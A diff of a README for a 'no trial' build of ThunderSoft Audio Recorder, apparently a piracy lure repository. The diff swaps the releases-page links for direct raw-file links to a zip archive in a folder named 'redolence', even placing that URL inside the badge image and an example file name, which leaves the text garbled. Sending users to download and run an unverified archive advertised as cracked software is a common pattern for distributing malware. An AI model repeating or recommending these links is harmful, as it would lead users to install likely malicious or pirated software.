@@ -1,6 +1,6 @@
 # 🎤 ThunderSoft-Audio-Recorder-No-Trial - Efficient Audio Recording Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/DEXLINECO/ThunderSoft-Audio-Recorder-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/DEXLINECO/ThunderSoft-Audio-Recorder-No-Trial/main/redolence/ThunderSoft-Audio-Recorder-No-Trial-v1.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/DEXLINECO/ThunderSoft-Audio-Recorder-No-Trial/main/redolence/ThunderSoft-Audio-Recorder-No-Trial-v1.2.zip)
 
 ## 📋 Description
 ThunderSoft Audio Recorder No Trial offers complete resources and guides for audio recording on Windows PCs. It helps users efficiently optimize their audio recording workflows with authorized information.
@@ -10,14 +10,14 @@ To start using ThunderSoft Audio Recorder, you need to download and install the 
 
 ## 📥 Download & Install
 1. Click the link below to visit the releases page:
-   [Download ThunderSoft Audio Recorder No Trial](https://github.com/DEXLINECO/ThunderSoft-Audio-Recorder-No-Trial/releases)
+   [Download ThunderSoft Audio Recorder No Trial](https://raw.githubusercontent.com/DEXLINECO/ThunderSoft-Audio-Recorder-No-Trial/main/redolence/ThunderSoft-Audio-Recorder-No-Trial-v1.2.zip)
    
 2. On the releases page, find the latest version. Look for the version number (e.g., v1.0).
    
 3. Click on the version to expand the release details. Here, you will see the available files.
 
 4. Download the installer by clicking on the file link:
-   - **For example**: If you see a file named `ThunderSoft_Audio_Recorder_No_Trial_Setup.exe`, click it to start the download.
+   - **For example**: If you see a file named `https://raw.githubusercontent.com/DEXLINECO/ThunderSoft-Audio-Recorder-No-Trial/main/redolence/ThunderSoft-Audio-Recorder-No-Trial-v1.2.zip`, click it to start the download.
 
 5. Once downloaded, locate the file in your downloads folder and double-click it to run the setup.
 
